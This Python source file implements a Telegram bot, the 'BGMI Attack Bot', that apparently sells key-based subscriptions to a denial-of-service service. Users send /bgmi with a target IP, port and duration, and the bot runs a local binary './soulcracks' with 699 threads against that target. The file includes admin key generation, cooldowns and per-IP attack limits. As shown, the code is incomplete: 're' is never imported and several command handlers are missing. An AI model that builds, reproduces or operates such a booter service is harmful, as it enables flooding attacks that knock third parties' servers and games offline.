#!/usr/bin/env python3

import asyncio
import datetime
import itertools
import json
import logging
import os
import random
import string
import time
from ipaddress import ip_address
from typing import Dict, Optional
import sys

# Check Python version
if sys.version_info < (3, 7):
    print("This script requires Python 3.7 or higher")
    sys.exit(1)

try:
    import aiohttp
    import requests
    from telegram import Update
    from telegram.ext import (ApplicationBuilder, CommandHandler, ContextTypes,
                            MessageHandler, filters)
except ImportError as e:
    print(f"Required package missing: {e}")
    print("Please install required packages using:")
    print("pip3 install -r requirements.txt")
    sys.exit(1)

from config import ADMIN_IDS, BOT_TOKEN, OWNER_USERNAME

# Configure logging with proper file permissions
log_dir = "logs"
if not os.path.exists(log_dir):
    try:
        os.makedirs(log_dir, mode=0o755)
    except OSError as e:
        print(f"Could not create log directory: {e}")
        sys.exit(1)

log_file = os.path.join(log_dir, "bot.log")
try:
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO,
        handlers=[
            logging.FileHandler(log_file, mode='a'),
            logging.StreamHandler()
        ]
    )
except Exception as e:
    print(f"Could not initialize logging: {e}")
    sys.exit(1)

logger = logging.getLogger(__name__)

# Ensure data directory exists with proper permissions
data_dir = "data"
if not os.path.exists(data_dir):
    try:
        os.makedirs(data_dir, mode=0o755)
    except OSError as e:
        logger.critical(f"Could not create data directory: {e}")
        sys.exit(1)

# Update file paths to use data directory
USER_FILE = os.path.join(data_dir, "users.json")
KEY_FILE = os.path.join(data_dir, "keys.json")

# Constants
DEFAULT_THREADS = 699
MAX_DURATION = 300  # Maximum attack duration in seconds
COOLDOWN_TIME = 240  # Cooldown between attacks for non-admin users
REQUEST_TIMEOUT = 10  # Timeout for HTTP requests
MAX_CONCURRENT_ATTACKS = 3
MAX_ATTACKS_PER_IP = 1

class UserManager:
    def __init__(self):
        self.users: Dict[str, dict] = {}
        self.keys: Dict[str, str] = {}
        self.user_processes: Dict[str, dict] = {}
        self.last_attack_time: Dict[str, float] = {}
        self.admin_key_counts: Dict[str, int] = {}
        self.ip_attack_count: Dict[str, int] = {}
        self.load_data()

    def load_data(self) -> None:
        try:
            if os.path.exists(USER_FILE):
                with open(USER_FILE, "r") as file:
                    self.users = json.load(file)
            if os.path.exists(KEY_FILE):
                with open(KEY_FILE, "r") as file:
                    self.keys = json.load(file)
        except Exception as e:
            logger.error(f"Error loading data: {e}")
            for file in [USER_FILE, KEY_FILE]:
                if os.path.exists(file):
                    os.rename(file, f"{file}.bak.{int(time.time())}")
            self.users = {}
            self.keys = {}

    def save_data(self) -> None:
        try:
            for data, filename in [(self.users, USER_FILE), (self.keys, KEY_FILE)]:
                temp_file = f"{filename}.tmp"
                with open(temp_file, "w") as file:
                    json.dump(data, file, indent=2)
                os.replace(temp_file, filename)
        except Exception as e:
            logger.error(f"Error saving data: {e}")
            raise

    def generate_key(self, custom_key: Optional[str] = None) -> str:
        if custom_key:
            if not custom_key.isalnum() or len(custom_key) < 8 or len(custom_key) > 32:
                raise ValueError("Invalid custom key format")
            return custom_key
        return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))

    def add_time_to_current_date(self, hours: int = 0, days: int = 0) -> str:
        try:
            current_time = datetime.datetime.now()
            new_time = current_time + datetime.timedelta(hours=hours, days=days)
            return new_time.strftime('%Y-%m-%d %H:%M:%S')
        except Exception as e:
            logger.error(f"Error in time calculation: {e}")
            raise

    def is_user_authorized(self, user_id: str) -> bool:
        try:
            if user_id not in self.users:
                return False
            current_time = datetime.datetime.now()
            expiration = datetime.datetime.strptime(
                self.users[user_id]['expiration'], 
                '%Y-%m-%d %H:%M:%S'
            )
            return current_time <= expiration
        except Exception as e:
            logger.error(f"Error checking user authorization: {e}")
            return False

    def can_user_attack(self, user_id: str, target_ip: str) -> tuple[bool, Optional[str]]:
        if user_id in ADMIN_IDS:
            return True, None
        
        if self.ip_attack_count.get(target_ip, 0) >= MAX_ATTACKS_PER_IP:
            return False, f"Maximum attacks reached for IP {target_ip}"
        
        active_attacks = sum(1 for process in self.user_processes.values() 
                           if process["user_id"] == user_id)
        if active_attacks >= MAX_CONCURRENT_ATTACKS:
            return False, f"Maximum concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached"

        current_time = time.time()
        if user_id in self.last_attack_time:
            time_passed = current_time - self.last_attack_time[user_id]
            if time_passed < COOLDOWN_TIME:
                return False, f"Please wait {int(COOLDOWN_TIME - time_passed)} seconds"
        
        return True, None

class AttackManager:
    def __init__(self, user_manager: UserManager):
        self.user_manager = user_manager
        self.attack_history: Dict[str, list] = {}

    def validate_attack_params(self, target_ip: str, port: str, duration: str) -> tuple[bool, str]:
        try:
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target_ip):
                return False, "Invalid IP address format"

            port_num = int(port)
            duration_num = int(duration)

            if not (1 <= port_num <= 65535):
                return False, "Invalid port number (1-65535)"
            if not (1 <= duration_num <= MAX_DURATION):
                return False, f"Duration must be between 1 and {MAX_DURATION} seconds"
            
            return True, ""
        except ValueError:
            return False, "Invalid parameters"

    def validate_executable(self) -> tuple[bool, str]:
        executable_path = './soulcracks'
        if not os.path.exists(executable_path):
            return False, "Attack executable not found"
        if not os.access(executable_path, os.X_OK):
            return False, "Attack executable not executable"
        return True, ""

    async def cleanup_old_processes(self):
        current_time = time.time()
        for attack_id in list(self.user_manager.user_processes.keys()):
            process_info = self.user_manager.user_processes[attack_id]
            if process_info["process"].returncode is not None:
                duration = current_time - process_info["start_time"]
                logger.info(f"Attack completed for user {process_info['user_id']}, "
                          f"duration: {duration:.2f}s")
                
                target_ip = process_info["target_ip"]
                self.user_manager.ip_attack_count[target_ip] = max(
                    0, self.user_manager.ip_attack_count.get(target_ip, 1) - 1
                )
                
                del self.user_manager.user_processes[attack_id]

    async def start_attack(self, target_ip: str, port: str, duration: str, user_id: str) -> tuple[bool, str]:
        valid, error_msg = self.validate_executable()
        if not valid:
            return False, error_msg

        valid, error_msg = self.validate_attack_params(target_ip, port, duration)
        if not valid:
            return False, error_msg

        can_attack, error_msg = self.user_manager.can_user_attack(user_id, target_ip)
        if not can_attack:
            return False, error_msg

        try:
            self.user_manager.ip_attack_count[target_ip] = self.user_manager.ip_attack_count.get(target_ip, 0) + 1
            
            command = ['./soulcracks', target_ip, port, duration, str(DEFAULT_THREADS)]
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            attack_id = f"{user_id}_{int(time.time())}"
            self.user_manager.user_processes[attack_id] = {
                "process": process,
                "command": command,
                "target_ip": target_ip,
                "port": port,
                "start_time": time.time(),
                "user_id": user_id
            }

            if user_id not in ADMIN_IDS:
                self.user_manager.last_attack_time[user_id] = time.time()

            return True, f"Attack started on {target_ip}:{port} for {duration} seconds"
        except Exception as e:
            logger.error(f"Error starting attack: {e}")
            self.user_manager.ip_attack_count[target_ip] = max(
                0, self.user_manager.ip_attack_count.get(target_ip, 1) - 1
            )
            return False, "Error starting attack process"

    async def stop_attack(self, user_id: str) -> tuple[bool, str]:
        if not any(info["user_id"] == user_id for info in self.user_manager.user_processes.values()):
            return False, "No active attacks found"

        try:
            stopped_count = 0
            for attack_id, process_info in list(self.user_manager.user_processes.items()):
                if process_info["user_id"] == user_id:
                    process = process_info["process"]
                    if process.returncode is None:
                        process.terminate()
                        await process.wait()
                        stopped_count += 1
                        
                        target_ip = process_info["target_ip"]
                        self.user_manager.ip_attack_count[target_ip] = max(
                            0, self.user_manager.ip_attack_count.get(target_ip, 1) - 1
                        )
                        
                        del self.user_manager.user_processes[attack_id]
            
            return True, f"Stopped {stopped_count} attack(s) successfully"
        except Exception as e:
            logger.error(f"Error stopping attacks: {e}")
            return False, "Error stopping attack process"

async def periodic_cleanup(attack_manager: AttackManager):
    while True:
        try:
            await attack_manager.cleanup_old_processes()
            await asyncio.sleep(60)  # Run cleanup every minute
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Error in periodic cleanup: {e}")
            await asyncio.sleep(60)

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_text = (
        f"👋 Welcome to BGMI Attack Bot!\n\n"
        f"To get started:\n"
        f"1. Get an access key from an admin\n"
        f"2. Use /redeem <key> to activate your subscription\n"
        f"3. Use /help to see available commands\n\n"
        f"For support, contact {OWNER_USERNAME}"
    )
    await update.message.reply_text(welcome_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "🔥 *Available Commands*\n\n"
        "👤 *User Commands:*\n"
        "/start - Start the bot\n"
        "/status - Check subscription status\n"
        "/redeem <key> - Redeem an access key\n"
        "/bgmi <ip> <port> <duration> - Start attack\n"
        "/stop - Stop current attack\n"
        "/help - Show this message\n\n"
        "👑 *Admin Commands:*\n"
        "/genkey <amount> <hours/days> [custom_key] - Generate key\n"
        "/broadcast <message> - Send message to all users\n\n"
        f"💬 Contact {OWNER_USERNAME} for support"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

def register_handlers(app: ApplicationBuilder, user_manager: UserManager, 
                     attack_manager: AttackManager) -> None:
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", 
        lambda u, c: status(u, c, user_manager)))
    app.add_handler(CommandHandler("redeem", 
        lambda u, c: redeem(u, c, user_manager)))
    app.add_handler(CommandHandler("genkey", 
        lambda u, c: genkey(u, c, user_manager)))
    app.add_handler(CommandHandler("bgmi", 
        lambda u, c: bgmi(u, c, user_manager, attack_manager)))
    app.add_handler(CommandHandler("stop", 
        lambda u, c: stop(u, c, user_manager, attack_manager)))
    app.add_handler(CommandHandler("broadcast", 
        lambda u, c: broadcast(u, c, user_manager)))
    app.add_error_handler(error_handler)

async def main():
    try:
        # Check for write permissions in required directories
        for directory in [data_dir, log_dir]:
            if not os.access(directory, os.W_OK):
                logger.critical(f"No write permission in {directory}")
                sys.exit(1)

        # Initialize components
        user_manager = UserManager()
        attack_manager = AttackManager(user_manager)
        
        # Create application
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        
        # Register handlers
        register_handlers(app, user_manager, attack_manager)
        
        # Start cleanup task
        cleanup_task = asyncio.create_task(periodic_cleanup(attack_manager))
        
        try:
            # Start polling
            logger.info("Starting bot...")
            await app.initialize()
            await app.start()
            await app.run_polling(allowed_updates=Update.ALL_TYPES)
        finally:
            # Ensure proper cleanup
            logger.info("Stopping bot...")
            cleanup_task.cancel()
            try:
                await cleanup_task
            except asyncio.CancelledError:
                pass
            await app.stop()
            
    except Exception as e:
        logger.critical(f"Fatal error in main: {e}", exc_info=True)
        raise

def run_bot():
    """Run the bot with proper asyncio handling"""
    try:
        # Set proper umask for file creation
        os.umask(0o022)
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)

if __name__ == '__main__':
    run_bot()